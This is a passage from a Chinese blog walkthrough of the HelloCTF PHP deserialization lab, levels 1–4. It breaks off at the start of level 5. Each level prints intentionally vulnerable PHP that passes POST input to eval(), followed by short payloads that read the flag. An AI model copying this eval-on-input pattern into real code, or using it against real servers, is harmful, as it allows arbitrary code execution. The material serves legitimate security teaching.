<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PHPSerialize-labs | Midnight Phantasmagoria!</title><meta name="author" content="Fischl0527"><meta name="copyright" content="Fischl0527"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Level-1 : 类的实例化这一关考的是类的实例化 12345678910111213141516171819202122232425262728&lt;?php &#x2F;*--- HelloCTF - 反序列化靶场 关卡 1 : 类的实例化 --- HINT：尝实例化下面的FLAG类吧！# -*- coding: utf-8 -*-# @Author: 探姬# @Date:   2024-07-01">
<meta property="og:type" content="article">
<meta property="og:title" content="PHPSerialize-labs">
<meta property="og:url" content="https://fischl0527.github.io/2025/08/25/%E7%9F%A5%E8%AF%86/PHPSerialize-labs/index.html">
<meta property="og:site_name" content="Midnight Phantasmagoria!">
<meta property="og:description" content="Level-1 : 类的实例化这一关考的是类的实例化 12345678910111213141516171819202122232425262728&lt;?php &#x2F;*--- HelloCTF - 反序列化靶场 关卡 1 : 类的实例化 --- HINT：尝实例化下面的FLAG类吧！# -*- coding: utf-8 -*-# @Author: 探姬# @Date:   2024-07-01">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://fischl0527.github.io/img/cover/PHPSerialize-labs.jpg">
<meta property="article:published_time" content="2025-08-25T03:45:14.000Z">
<meta property="article:modified_time" content="2025-08-27T15:00:06.932Z">
<meta property="article:author" content="Fischl0527">
<meta property="article:tag" content="PHP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://fischl0527.github.io/img/cover/PHPSerialize-labs.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "PHPSerialize-labs",
  "url": "https://fischl0527.github.io/2025/08/25/%E7%9F%A5%E8%AF%86/PHPSerialize-labs/",
  "image": "https://fischl0527.github.io/img/cover/PHPSerialize-labs.jpg",
  "datePublished": "2025-08-25T03:45:14.000Z",
  "dateModified": "2025-08-27T15:00:06.932Z",
  "author": [
    {
      "@type": "Person",
      "name": "Fischl0527",
      "url": "https://fischl0527.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/null-5119bf9f9071d171.jpg"><link rel="canonical" href="https://fischl0527.github.io/2025/08/25/%E7%9F%A5%E8%AF%86/PHPSerialize-labs/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PHPSerialize-labs',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/875E73166434C2B697688F4E9DB5AA6B.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover/PHPSerialize-labs.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Midnight Phantasmagoria!</span></a><a class="nav-page-title" href="/"><span class="site-name">PHPSerialize-labs</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PHPSerialize-labs</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-08-25T03:45:14.000Z" title="Created 2025-08-25 11:45:14">2025-08-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-08-27T15:00:06.932Z" title="Updated 2025-08-27 23:00:06">2025-08-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Knowledge/">Knowledge</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">6.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>30mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Level-1-类的实例化"><a href="#Level-1-类的实例化" class="headerlink" title="Level-1 : 类的实例化"></a>Level-1 : 类的实例化</h1><p>这一关考的是类的实例化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 1 : 类的实例化 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：尝实例化下面的FLAG类吧！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag_string</span> = <span class="string">&quot;HelloCTF&#123;？？？？&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;flag_string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>

<p>直接 POST  code&#x3D;$a&#x3D;new FLAG();就行了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754795963034-13343e51-7781-4c3a-bca3-35e3f3ad10d0.png"></p>
<h1 id="Level-2-对象中值的传递"><a href="#Level-2-对象中值的传递" class="headerlink" title="Level-2 : 对象中值的传递"></a>Level-2 : 对象中值的传递</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 2 : 类值的传递 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：尝试将flag传递出来~</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"> <span class="variable">$flag_string</span> = <span class="string">&quot;HelloCTF&#123;？？？？&#125;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$free_flag</span> = <span class="string">&quot;???&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">get_free_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;free_flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$target</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">       <span class="variable">$target</span>-&gt;<span class="title function_ invoke__">get_free_flag</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Now Flag is ???</span></span><br></pre></td></tr></table></figure>

<p>进行赋值操作，我们需要把 $free_flag 里的东西用 $flag_string 进行赋值，这样才能， $target-&gt;get_free_flag() ，即输出 flag。</p>
<p>赋值操作即：POST code&#x3D;$target-&gt;free_flag&#x3D;$flag_string;</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754796371784-41a73ffa-8b52-4e38-8127-e57a7297758c.png"></p>
<h1 id="Level-3-对象中值的权限"><a href="#Level-3-对象中值的权限" class="headerlink" title="Level-3 : 对象中值的权限"></a>Level-3 : 对象中值的权限</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 3 : 对象中值的权限 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：尝试将flag传递出来~</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$public_flag</span> = <span class="string">&quot;HelloCTF&#123;?&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protected_flag</span> = <span class="string">&quot;?&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$private_flag</span> = <span class="string">&quot;?&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_protected_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_private_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubFLAG</span> <span class="keyword">extends</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_protected_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_private_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="variable">$sub_target</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SubFLAG</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Trying to get FLAG...&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Public Flag: &quot;</span>.<span class="variable">$target</span>-&gt;public_flag.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Protected Flag:&quot;</span>.<span class="variable">$target</span>-&gt;protected_flag .<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Private Flag:&quot;</span>.<span class="variable">$target</span>-&gt;private_flag .<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Trying to get FLAG...</span></span><br><span class="line"><span class="comment">Public Flag: HelloCTF&#123;se3_me_</span></span><br><span class="line"><span class="comment">Protected Flag: Error: Cannot access protected property FLAG:: in ?</span></span><br><span class="line"><span class="comment">Private Flag: Error: Cannot access private property FLAG:: in ?</span></span><br><span class="line"><span class="comment">...Wait,where is the flag?</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>public（公有）： 公有的类成员可以在任何地方被访问。protected（受保护）： 受保护的类成员则可以被其自身以及其子类和父类访问。(可继承)。private（私有）： 私有的类成员则只能被其定义所在的类访问。(不可继承)</p>
<p>所以我们需要直接调用 FLAG 里的获取类的成员的函数即 get_protected_flag()、get_private_flag()就行了，playload 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=echo $target-&gt;public_flag.$target-&gt;get_protected_flag().$target-&gt;get_private_flag();</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754796878395-518de81a-ddc7-418f-8d6c-54cfaa102e4b.png"></p>
<h1 id="Level-4-序列化"><a href="#Level-4-序列化" class="headerlink" title="Level-4 : 序列化"></a>Level-4 : 序列化</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 4 : 序列化 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：嗯！？全是私有，怎么获取flag呢？试试序列化！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG3</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag3_object_array</span> = <span class="keyword">array</span>(<span class="string">&quot;？&quot;</span>,<span class="string">&quot;？&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$flag1_string</span> = <span class="string">&quot;？&quot;</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$flag2_number</span> = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$flag3_object</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag3_object = <span class="keyword">new</span> <span class="title class_">FLAG3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag_is_here</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>序列化一下就行了，可以直接将私有化的东西输出</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754797615320-aabcff2d-bf51-45f3-80a5-0f3ff431bcdf.png"></p>
<h1 id="Level-5-序列化规则"><a href="#Level-5-序列化规则" class="headerlink" title="Level-5 : 序列化规则"></a>Level-5 : 序列化规则</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 5 : 序列化规则 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span 